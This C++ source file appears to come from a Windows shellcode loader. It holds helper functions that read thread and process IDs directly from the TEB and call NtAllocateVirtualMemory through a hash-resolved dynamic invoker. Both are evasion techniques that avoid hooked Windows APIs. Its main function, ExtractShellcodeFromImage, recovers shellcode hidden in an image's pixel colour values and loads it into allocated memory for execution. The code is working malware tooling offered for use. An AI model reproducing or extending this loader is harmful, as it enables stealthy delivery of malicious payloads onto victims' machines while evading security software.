#include "Tools.h"
#include "definition.h"
#include "Function.hpp"


static auto& dynamicInvoker = DynamicInvoker::get_instance();

// DebugPrint
#ifdef _DEBUG
void DebugPrintA(const char* format, ...) {
	char buffer[1024];
	va_list args;
	va_start(args, format);
	vsprintf_s(buffer, sizeof(buffer), format, args);
	va_end(args);
	OutputDebugStringA(buffer);
	std::cout << buffer << std::endl;
}
void DebugPrintW(const wchar_t* format, ...) {
	wchar_t buffer[1024];
	va_list args;
	va_start(args, format);
	vswprintf_s(buffer, sizeof(buffer) / sizeof(wchar_t), format, args);
	va_end(args);
	OutputDebugStringW(buffer);
	std::wcout << buffer << std::endl;
}
#else
void DebugPrintA(const char* format, ...) {}
void DebugPrintW(const wchar_t* format, ...) {}

#endif



LPSTR charToLPSTR(const char* str) {
	if (str == nullptr) {
		return nullptr;
	}

	size_t len = strlen(str);

	LPSTR lpstr = (LPSTR)LocalAlloc(LPTR, len + 1);

	if (lpstr != nullptr) {
		strcpy_s(lpstr, len + 1, str);
	}

	return lpstr;
}
LPCWSTR charToLPCWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}
LPWSTR charToLPWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];  // Adjust buffer size as needed
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}

DWORD myGetCurrentThreadId() {
	static PTEB teb;
	if (!teb) {
		teb = (PTEB)__readgsqword(0x30);
	}
	return (DWORD)(teb->ClientId.UniqueThread);
}


DWORD myGetCurrentProcessId() {
	static PTEB teb;
	if (!teb) {
		teb = (PTEB)__readgsqword(0x30);
	}
	return (DWORD)(teb->ClientId.UniqueProcess);
}

ULONG64 AR_getTickcount64() {
	PKUSER_SHARED_DATA sharedData = (PKUSER_SHARED_DATA)(0x7FFE0000);
	ULONG64 uptime = ((sharedData->TickCountMultiplier) * (sharedData->TickCountQuad)) >> 24;
	return uptime;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}
wchar_t* _strstri_w(const wchar_t* s, const wchar_t* sub_s)
{
	wchar_t c0, c1, c2, * tmps, * tmpsub;

	if (s == sub_s)
		return (wchar_t*)s;

	if (s == 0)
		return 0;

	if (sub_s == 0)
		return 0;

	c0 = locase_w(*sub_s);
	while (c0 != 0) {

		while (*s != 0) {
			c2 = locase_w(*s);
			if (c2 == c0)
				break;
			s++;
		}

		if (*s == 0)
			return 0;

		tmps = (wchar_t*)s;
		tmpsub = (wchar_t*)sub_s;
		do {
			c1 = locase_w(*tmps);
			c2 = locase_w(*tmpsub);
			tmps++;
			tmpsub++;
		} while ((c1 == c2) && (c2 != 0));

		if (c2 == 0)
			return (wchar_t*)s;

		s++;
	}
	return 0;
}

BOOL ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE* shellcode, DWORD* size) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromFile(imagePath);
    if (!bitmap) {
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return FALSE;
    }
    // 读取大小信息（前4个字节）
    BYTE size_bytes[4] = {0};
    DWORD byte_idx = 0;
    
    // 直接读取前4个字节作为大小信息
    for (UINT y = 0; y < bitmap->GetHeight() && byte_idx < 4; y++) {
        for (UINT x = 0; x < bitmap->GetWidth() && byte_idx < 4; x++) {
            Gdiplus::Color color;
            bitmap->GetPixel(x, y, &color);
            
            for (int c = 0; c < 3 && byte_idx < 4; c++) {
                switch (c) {
                    case 0: size_bytes[byte_idx] = color.GetR(); break;
                    case 1: size_bytes[byte_idx] = color.GetG(); break;
                    case 2: size_bytes[byte_idx] = color.GetB(); break;
                }
                byte_idx++;
            }
        }
    }
    // 从字节数组中读取大小
    *size = *(DWORD*)size_bytes;
    // DebugPrintA("[DEBUG] Extracted size: %d\n", *size);
    // DebugPrintA("[DEBUG] Size bytes: %02X %02X %02X %02X\n", 
    //             size_bytes[0], size_bytes[1], size_bytes[2], size_bytes[3]);
    
	PVOID baseAddress = NULL;
	SIZE_T regionSize = *size;
	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(
		NtAllocateVirtualMemoryStruct.funcAddr,
		NtAllocateVirtualMemoryStruct.funcHash,
		(HANDLE)-1,      
		&baseAddress,    
		0,               
		&regionSize,     
		MEM_COMMIT,      
		PAGE_READWRITE   
	);

	if (!NT_SUCCESS(status)) {
		delete bitmap;
		Gdiplus::GdiplusShutdown(gdiplusToken);
		return FALSE;
	}
	*shellcode = (PBYTE)baseAddress;

	ZeroMemory(*shellcode, *size);
    byte_idx = 0;
    DWORD data_idx = 0;
    
    // 从第5个字节开始读取数据
    for (UINT y = 0; y < bitmap->GetHeight() && data_idx < *size; y++) {
        for (UINT x = 0; x < bitmap->GetWidth() && data_idx < *size; x++) {
            Gdiplus::Color color;
            bitmap->GetPixel(x, y, &color);
            
            for (int c = 0; c < 3 && data_idx < *size; c++) {
                if (byte_idx >= 4) {  // 跳过大小信息
                    switch (c) {
                        case 0: (*shellcode)[data_idx++] = color.GetR(); break;
                        case 1: (*shellcode)[data_idx++] = color.GetG(); break;
                        case 2: (*shellcode)[data_idx++] = color.GetB(); break;
                    }
                }
                byte_idx++;
            }
        }
    }
    delete bitmap;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return TRUE;
}
